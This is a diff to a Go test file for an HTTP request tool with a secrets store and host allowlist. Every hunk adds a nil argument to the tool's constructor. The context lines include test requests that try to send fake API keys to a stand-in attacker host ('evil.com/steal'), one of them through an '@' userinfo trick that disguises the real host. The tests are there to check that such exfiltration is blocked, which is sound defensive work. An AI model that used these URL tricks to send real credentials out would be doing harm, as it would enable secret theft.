@@ -34,7 +34,7 @@ func TestHTTPRequestBasicGET(t *testing.T) {
 	}))
 	defer srv.Close()
 
-	tool := NewHTTPRequestTool(nil)
+	tool := NewHTTPRequestTool(nil, nil)
 	params, _ := json.Marshal(map[string]interface{}{
 		"url": srv.URL + "/test",
 	})
@@ -70,7 +70,7 @@ api_key = "sk-secret-123"
 allowed_hosts = ["%s"]
 `, srv.Listener.Addr().(*net.TCPAddr).IP.String()))
 
-	tool := NewHTTPRequestTool(store)
+	tool := NewHTTPRequestTool(store, nil)
 	params, _ := json.Marshal(map[string]interface{}{
 		"url": srv.URL + "/api",
 		"headers": map[string]string{
@@ -99,7 +99,7 @@ api_key = "sk-secret-123"
 allowed_hosts = ["api.allowed.com"]
 `)
 
-	tool := NewHTTPRequestTool(store)
+	tool := NewHTTPRequestTool(store, nil)
 	params, _ := json.Marshal(map[string]interface{}{
 		"url": "https://evil.com/steal",
 		"headers": map[string]string{
@@ -123,7 +123,7 @@ api_key = "sk-secret-123"
 allowed_hosts = ["api.example.com"]
 `)
 
-	tool := NewHTTPRequestTool(store)
+	tool := NewHTTPRequestTool(store, nil)
 	params, _ := json.Marshal(map[string]interface{}{
 		"url": "https://api.example.com@evil.com/steal",
 		"headers": map[string]string{
@@ -146,7 +146,7 @@ func TestHTTPRequestNoAllowedHosts(t *testing.T) {
 token = "sk-legacy-token"
 `)
 
-	tool := NewHTTPRequestTool(store)
+	tool := NewHTTPRequestTool(store, nil)
 	params, _ := json.Marshal(map[string]interface{}{
 		"url": "https://api.example.com/data",
 		"headers": map[string]string{
@@ -170,7 +170,7 @@ func TestHTTPRequestNoSecretsNoRestriction(t *testing.T) {
 	defer srv.Close()
 
 	// nil store — no secrets at all
-	tool := NewHTTPRequestTool(nil)
+	tool := NewHTTPRequestTool(nil, nil)
 	params, _ := json.Marshal(map[string]interface{}{
 		"url": srv.URL + "/public",
 	})
@@ -198,7 +198,7 @@ api_key = "sk-supersecret-should-be-redacted"
 allowed_hosts = ["%s"]
 `, srv.Listener.Addr().(*net.TCPAddr).IP.String()))
 
-	tool := NewHTTPRequestTool(store)
+	tool := NewHTTPRequestTool(store, nil)
 	params, _ := json.Marshal(map[string]interface{}{
 		"url": srv.URL + "/echo",
 		"headers": map[string]string{
@@ -225,7 +225,7 @@ func TestHTTPRequestQueryParams(t *testing.T) {
 	}))
 	defer srv.Close()
 
-	tool := NewHTTPRequestTool(nil)
+	tool := NewHTTPRequestTool(nil, nil)
 	params, _ := json.Marshal(map[string]interface{}{
 		"url": srv.URL + "/search",
 		"query": map[string]string{
@@ -258,7 +258,7 @@ key = "key-b"
 allowed_hosts = ["other.example.com"]
 `)
 
-	tool := NewHTTPRequestTool(store)
+	tool := NewHTTPRequestTool(store, nil)
 	params, _ := json.Marshal(map[string]interface{}{
 		"url": "https://api.example.com/data",
 		"headers": map[string]string{
